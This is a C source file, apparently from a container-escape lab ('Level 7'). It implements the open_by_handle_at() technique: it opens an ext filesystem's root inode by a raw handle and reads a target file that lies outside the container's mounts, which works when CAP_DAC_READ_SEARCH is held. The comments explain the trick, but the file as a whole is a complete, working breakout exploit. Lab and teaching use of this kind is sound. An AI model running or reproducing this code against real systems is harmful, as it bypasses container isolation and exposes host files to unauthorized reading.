// handle_reader.c - a tiny open_by_handle_at() demonstrator for Level 7.
//
// The trick it shows:
//   open_by_handle_at(2) resolves a file from a raw {inode, generation} handle
//   on a filesystem, COMPLETELY IGNORING path/mount-namespace reachability. The
//   kernel only lets you do it if you hold CAP_DAC_READ_SEARCH. So with that one
//   capability you can read any file on a filesystem you can touch even ONE spot
//   of - including files that were never bind-mounted into your container.
//
// We call the syscall directly (syscall(2)) and define the handle struct
// ourselves, so the build doesn't depend on libc exposing a wrapper.
//
// Usage: handle-read [anchor] [target] [inode] [generation]
//   anchor      a path on the target filesystem you CAN open (default /share)
//   target      name to read relative to that filesystem's root (default secret.txt)
//   inode       root inode to jump to (default 2 - the root of any ext2/3/4 fs)
//   generation  handle generation (default 0 - the root inode's generation)
#define _GNU_SOURCE
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <sys/syscall.h>

// The kernel's definition of the handle struct is in include/uapi/linux/fs.h, but we
// don't want to depend on that header being present, so we define it ourselves.
struct fhandle {
    unsigned int handle_bytes;
    int handle_type;
    unsigned char f_handle[8];
};

#define EXT_HANDLE_TYPE 1  // FILEID_INO32_GEN: ext2/3/4 {inode, generation}

static int open_by_handle(int mount_fd, struct fhandle *fh, int flags) {
    return (int)syscall(SYS_open_by_handle_at, mount_fd, fh, flags);
}

int main(int argc, char **argv) {
    const char *anchor = argc > 1 ? argv[1] : "/share";
    const char *target = argc > 2 ? argv[2] : "secret.txt";
    unsigned long ino  = argc > 3 ? strtoul(argv[3], NULL, 0) : 2;
    unsigned long gen  = argc > 4 ? strtoul(argv[4], NULL, 0) : 0;

    // Open a file on the target filesystem to get a mount point fd. This is the only
    // thing that needs to be reachable in the container. The rest of the path is
    // irrelevant, because open_by_handle_at() ignores it.
    int mount_fd = open(anchor, O_RDONLY);
    if (mount_fd < 0) {
        fprintf(stderr, "open(%s): %s\n", anchor, strerror(errno));
        return 1;
    }

    struct fhandle fh;
    memset(&fh, 0, sizeof fh);
    fh.handle_bytes = 8;
    fh.handle_type  = EXT_HANDLE_TYPE;
    unsigned int *raw = (unsigned int *)fh.f_handle;
    raw[0] = (unsigned int)ino;   // inode number
    raw[1] = (unsigned int)gen;   // generation

    // Now we can open the filesystem root by handle, even though it was never mounted into this container.
    int root_fd = open_by_handle(mount_fd, &fh, O_RDONLY);
    if (root_fd < 0) {
        fprintf(stderr,
            "open_by_handle_at: %s\n"
            "  (this syscall requires CAP_DAC_READ_SEARCH -- that is the whole point)\n",
            strerror(errno));
        return 1;
    }

    // And now we can open the target file relative to that root, and read it.
    int f = openat(root_fd, target, O_RDONLY);
    if (f < 0) {
        fprintf(stderr, "openat(root, %s): %s\n", target, strerror(errno));
        return 1;
    }

    char buf[4096];
    ssize_t n;
    while ((n = read(f, buf, sizeof buf)) > 0) {
        if (write(1, buf, n) != n) return 1;
    }
    return 0;
}
